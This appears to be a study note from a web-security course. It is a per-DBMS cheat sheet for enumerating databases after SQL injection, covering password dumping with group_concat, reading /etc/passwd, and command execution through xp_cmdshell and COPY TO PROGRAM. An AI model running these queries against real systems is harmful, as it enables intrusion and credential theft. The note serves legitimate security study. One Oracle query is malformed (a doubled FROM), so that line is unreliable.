---
type: concept
title: SQL database enumeration (per-DBMS)
lang: en
status: active
sources: [web-200-oswa]
updated: 2026-07-31
---

# SQL database enumeration (per-DBMS)

Once [[sql-injection]] is confirmed, enumerate the database *before* dumping so you target
the right data and pick the right payload. The ladder is the same everywhere — **version →
current user & privileges → databases/schemas → tables → columns → rows** — but the syntax
and the string-aggregation function differ by engine. Aggregation matters because
error-based extraction returns a single value, so multi-row output must be collapsed with
`group_concat`/`STRING_AGG`/`LISTAGG`.

## MySQL / MariaDB

```sql
SELECT version();                    -- or @@version
SELECT current_user(), database();
SHOW GRANTS;                         -- privileges (look for FILE, SUPER)
SELECT schema_name FROM information_schema.schemata;
SELECT table_name  FROM information_schema.tables  WHERE table_schema='app';
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT group_concat(username,0x3a,password) FROM users;   -- collapse rows
SELECT LOAD_FILE('/etc/passwd');     -- read (needs FILE priv + secure_file_priv off)
```
Comments: `-- ` (note trailing space), `#`, `/**/`. Concatenation: `CONCAT()` / `0x..` hex.

## Microsoft SQL Server

```sql
SELECT @@version;
SELECT SYSTEM_USER, DB_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');                 -- are we DBA?
SELECT name FROM sys.databases;
SELECT name FROM app.sys.tables;                     -- or sysobjects WHERE xtype='U'
SELECT name FROM sys.columns WHERE object_id=OBJECT_ID('app.dbo.users');
SELECT STRING_AGG(name,',') FROM sys.tables;         -- 2017+; older: FOR XML PATH('')
EXEC xp_cmdshell 'whoami';                           -- RCE if enabled (sp_configure)
```
Stacked queries (`;`) are commonly allowed → INSERT/UPDATE/DDL and config changes. Concat: `+`.

## PostgreSQL

```sql
SELECT version();
SELECT current_user, current_database();
SELECT usesuper FROM pg_user WHERE usename=current_user;   -- superuser?
SELECT table_schema,table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='users';
SELECT STRING_AGG(usename,',') FROM pg_user;
COPY (SELECT '') TO PROGRAM 'id';    -- RCE if superuser
```
Concatenation: `||`. File read via `pg_read_file()`.

## Oracle

Every `SELECT` needs a `FROM`; use `dual`. No `LIMIT` — use `ROWNUM`/`FETCH FIRST`.

```sql
SELECT banner FROM v$version;
SELECT user FROM dual;
SELECT table_name FROM all_tables;                   -- or user_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS';
SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username) FROM all_users FROM dual;
```
Concatenation: `||`. Table/column names are usually UPPER-CASE.

## Why it feeds exploitation

The Piwigo worked example on [[sql-injection]] uses exactly this: MySQL `information_schema`
+ `group_concat()` inside `extractvalue()`, iterating with `LIMIT/OFFSET` because the XPATH
error truncates output. Automated dumping is what [[sqlmap]] does under the hood.

*Source: [[web-200-oswa]] module 8 (Introduction to SQL).*
